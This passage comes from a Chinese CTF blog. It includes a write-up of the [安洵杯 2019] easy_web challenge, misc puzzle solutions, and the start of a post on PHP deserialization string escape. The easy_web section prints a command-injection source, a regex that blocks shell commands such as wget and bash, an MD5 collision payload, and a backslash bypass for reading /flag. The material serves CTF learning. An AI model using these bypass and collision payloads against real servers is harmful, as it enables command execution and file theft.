src="https://img-blog.csdnimg.cn/20201111160938537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>拼接一下就行。<br>这个是报错注入的注意点。不管做什么注入的题目，判断闭合符号和测试过滤条件是首先要做的。尽量将大部分测试出来。然后找可以绕过的点，还有出题人可能要考察的知识点。</p><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>题目来源——[安洵杯 2019]easy_web——BUUCTF<br>在群里看到有人问这个，所以就看了看。挺有意思的一个题。总结一下<br><img src="https://img-blog.csdnimg.cn/20201111193756821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>首先看到这个编码，疑似base64，解码后更像base64了，最后进行base16转换，就可以得到这样的<img src="https://img-blog.csdnimg.cn/20201111193909565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>所以这可能是命令执行的加密逻辑；<br>将<code>index.php</code>进行加密后得到</p><pre class="language-bash" data-language="bash"><code class="language-bash">TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code></pre><p>传入</p><pre class="language-bash" data-language="bash"><code class="language-bash">?img<span class="token operator">=</span>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3<span class="token operator">&amp;</span><span class="token assign-left variable">cmd</span><span class="token operator">=</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201111194047956.png#pic_center" alt="m0re" loading="lazy"><br>base64解码，得到<br>index.php的源代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/gif;base64,"</span> <span class="token punctuation">.</span> <span class="token variable">$txt</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">body</span><span class="token punctuation">&#123;</span>   <span class="token property">background</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./bj.png<span class="token punctuation">)</span></span>  no-repeat center center<span class="token punctuation">;</span>   <span class="token property">background-size</span><span class="token punctuation">:</span>cover<span class="token punctuation">;</span>   <span class="token property">background-attachment</span><span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>   <span class="token property">background-color</span><span class="token punctuation">:</span>#CCCCCC<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>进行代码审计，找到重要部分代码，这个</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span></code></pre><p>需要绕过正则，还有下面的MD5强类型碰撞，因为用的是<code>===</code><br>所以，在进行，命令执行的时候，还要注意绕过MD5强碰撞。<br>百度找下MD5强碰撞绕过。<br>找到payload如下：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2b<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre><p>然后可以开始利用，进行命令执行部分的绕过。<br>正则匹配，过滤<code>ls</code>等常见命令，到那时找一圈，没发现<code>dir</code>，所以可以使用dir进行查看目录。<br><img src="https://img-blog.csdnimg.cn/20201111200341288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>没找到flag，想一下，思考flag的位置，也就是根目录下了。<br><img src="https://img-blog.csdnimg.cn/20201111200904320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这里要注意的是空格，在里面被过滤了，需要进行URL编码一下，才可以利用。所以这里是<code>dir%20/</code><br>然后怎么得到flag是个问题，cat、more等命令被禁了。<br>测试发现反斜扛是没有被过滤的，然后看正则，</p><pre class="language-php" data-language="php"><code class="language-php">ls<span class="token operator">|</span>bash<span class="token operator">|</span>tac<span class="token operator">|</span>nl<span class="token operator">|</span>more<span class="token operator">|</span>less<span class="token operator">|</span>head<span class="token operator">|</span>wget<span class="token operator">|</span>tail<span class="token operator">|</span>vi<span class="token operator">|</span>cat<span class="token operator">|</span>od<span class="token operator">|</span>grep<span class="token operator">|</span>sed<span class="token operator">|</span>bzmore<span class="token operator">|</span>bzless<span class="token operator">|</span>pcre<span class="token operator">|</span>paste<span class="token operator">|</span>diff<span class="token operator">|</span>file<span class="token operator">|</span><span class="token keyword">echo</span><span class="token operator">|</span>sh<span class="token operator">|</span>\'<span class="token operator">|</span>\"<span class="token operator">|</span>\`<span class="token operator">|</span><span class="token punctuation">;</span><span class="token operator">|</span><span class="token punctuation">,</span><span class="token operator">|</span>\<span class="token operator">*</span><span class="token operator">|</span>\<span class="token operator">?</span><span class="token operator">|</span>\<span class="token package"><span class="token punctuation">\</span></span><span class="token operator">|</span>\<span class="token package"><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span></span><span class="token operator">|</span>\<span class="token package">n</span><span class="token operator">|</span>\<span class="token package">t</span><span class="token operator">|</span>\<span class="token package">r</span><span class="token operator">|</span>\<span class="token package">xA0</span><span class="token operator">|</span>\<span class="token punctuation">&#123;</span><span class="token operator">|</span>\<span class="token punctuation">&#125;</span><span class="token operator">|</span>\<span class="token punctuation">(</span><span class="token operator">|</span>\<span class="token punctuation">)</span><span class="token operator">|</span>\<span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">^</span>\<span class="token package">d</span><span class="token punctuation">]</span><span class="token operator">|</span>@<span class="token operator">|</span>\<span class="token operator">||</span>\<span class="token package"><span class="token punctuation">\</span></span>$<span class="token operator">|</span>\<span class="token punctuation">[</span><span class="token operator">|</span>\<span class="token punctuation">]</span><span class="token operator">|</span><span class="token punctuation">&#123;</span><span class="token operator">|</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\<span class="token punctuation">(</span><span class="token operator">|</span>\<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">-</span><span class="token operator">|</span><span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">></span></code></pre><p>其中<code>|\?|\\|\\\\|\n|</code>中是将<code>\</code>过滤的，有点不理解就看大佬wp，说是这里反斜杠逃逸。<br>所以可以利用反斜杠。<br>我自己的理解</p><blockquote><p><code>\\\\</code><br>四个反斜杠，前面两个解释成一个反斜杠，后面两个解释成一个反斜杠。两个反斜杠相当于玩了个寂寞，都没有跟东西所以反斜杠实际上没有被过滤。相当于替换双斜杠。如果要过滤反斜杠要么两个或者三个。</p></blockquote><p>这里使用<code>ca\t%20/flag</code>就可以读出flag了。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1024杯misc签到"><a href="#1024杯misc签到" class="headerlink" title="1024杯misc签到"></a>1024杯misc签到</h3><blockquote><p>描述：地图，各个路口的编号，flag遗落在其中了，flag路口的编号是连续的</p></blockquote><p>路口编号，第一个路口不知道是什么，找到第一个，剩下的就好找了<br>出题人是<code>9u4ck</code>师傅，找师傅的id试试，<br>直到<code>9u4</code>发现了端倪<br><img src="https://img-blog.csdnimg.cn/20201112154856289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>跟上了<code>fl</code>，再找就找路口编号就行。<br><img src="https://img-blog.csdnimg.cn/20201112155119879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">56520</span> <span class="token number">78210</span> <span class="token number">35498184</span> 9u4fl<span class="token number">78210</span> <span class="token number">81068</span> <span class="token number">79650456</span> ag<span class="token punctuation">&#123;</span>We <span class="token number">81068</span> <span class="token number">86056</span> <span class="token number">65454545</span> lcom<span class="token number">86056</span> <span class="token number">89556</span> <span class="token number">16548421</span>  _102<span class="token number">89556</span> <span class="token number">91205</span> <span class="token number">26568154</span>  4_Cha<span class="token number">91205</span> <span class="token number">94156</span> <span class="token number">566512548</span> lleng<span class="token number">94156</span> <span class="token number">96825</span> <span class="token number">15487856</span> _9u4<span class="token number">96825</span> <span class="token number">98155</span> <span class="token number">156565645</span>  ck<span class="token punctuation">&#125;</span><span class="token number">56</span></code></pre><p>拼接出来flag</p><h3 id="1024杯misc重新签到"><a href="#1024杯misc重新签到" class="headerlink" title="1024杯misc重新签到"></a>1024杯misc重新签到</h3><p>题目来源ctf.show平台<br>hint.txt提示到一关一关解出flag<br>第一关，压缩包，拖进010editor查看，测试出不是伪加密，在末尾看到了提示，<br><img src="https://img-blog.csdnimg.cn/20201112141712695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>但是爆破密码无果。<br>于是进行CRC32碰撞。得到密码。<br><img src="https://img-blog.csdnimg.cn/20201112085112627.png#pic_center" alt="m0re" loading="lazy"><br>然后是steghide隐写</p><pre class="language-bash" data-language="bash"><code class="language-bash">steghide extract -sf level_2.jpg -p 0009656856</code></pre><p><img src="https://img-blog.csdnimg.cn/20201112142954967.png#pic_center" alt="m0re" loading="lazy"><br>发现得到的是<code>密码是什么呀</code><br>然后就是<br><img src="https://img-blog.csdnimg.cn/20201112144358466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>密码是32 bits，想的是md5，但是密码什么却不知道，怎么加密也不知道。所以就卡住了。<br>看了大师傅的wp后，<br>emmm，脑洞啊，太小了。还有就是，这个没有那么多提示了。<br>提示如下：<br><img src="https://img-blog.csdnimg.cn/20201112144605279.png#pic_center" alt="m0re" loading="lazy"><br>脑洞了，可惜我脑洞太小，猜不出来。<br>wp说的是将<code>什么呀</code>经过<code>sha1</code>加密得到压缩包的密码。<br><code>a95aea415a4d76c323b13423a22f72c56ca912b6</code><br>最后得到flag</p><h3 id="1024-大威天龙"><a href="#1024-大威天龙" class="headerlink" title="1024_大威天龙"></a>1024_大威天龙</h3><p>拉近010editor查看，改下高度，发现下方文字。<br><img src="https://img-blog.csdnimg.cn/20201112161427845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>如是我闻开头，佛曰，与佛论禅在线网站。<br>解出是新佛曰，也有对应的在线网站。<br>再次解出熊曰，同样是在线网站<br>最后熊曰解出的是佛又曰，重点在这里，这个之前没见过，收集一下网站。<br><a href="https://tools.takuron.top/talk-with-buddha/">佛又曰在线网站</a><br>需要箴言，也就是密钥<br>箴言在题目描述中，出题师傅已经给了。<br><code>大威天龙，世尊地藏，般若诸佛，般若巴嘛哄</code><br><img src="https://img-blog.csdnimg.cn/20201112162150477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次学习有复习以前的知识，还有获取新知识，SQL注入是一块大饼，还是要慢慢啃。下周继续努力。</p>]]></content>
      
      
      <categories>
          
          <category> CTF题记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化字符逃逸</title>
      <link href="/posts/17567ada/"/>
      <url>/posts/17567ada/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>反序列化字符逃逸是最近很常见的题目，所以学习一下这个方面的知识。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>反序列化，理解之后。做题就没有那么难了，看了一篇微信推文，让我理解了PHP反序列化字符逃逸这个难点。</p><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">m0re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'1emon'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$bbb</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'qwzf'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$SL</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'shalou'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">m0re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>序列化结果</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"m0re"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"aaa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"1emon"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"bbb"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"qwzf"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"SL"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"shalou"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>反序列化的过程就是碰到<code>;&#125;</code>与最前面的<code>&#123;</code>配对后，便停止反序列化。<br>在后面加上一些字符进行测试。像这样</p><p><img src="https://img-blog.csdnimg.cn/20201110233927463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>仍然反序列化成功而且没有任何报错，足以说明反序列化的结束标志是<code>;&#125;</code><br>理解了这个就可以进行反序列化字符逃逸的学习了。</p><h3 id="关键字符增加"><a href="#关键字符增加" class="headerlink" title="关键字符增加"></a>关键字符增加</h3><p>反序列化逃逸的题目，会使用<code>preg_replace</code>函数替换关键字符，会使得关键字符增多或减少，首先介绍使关键字符增多的。<br>正常序列化的结果，<br><img 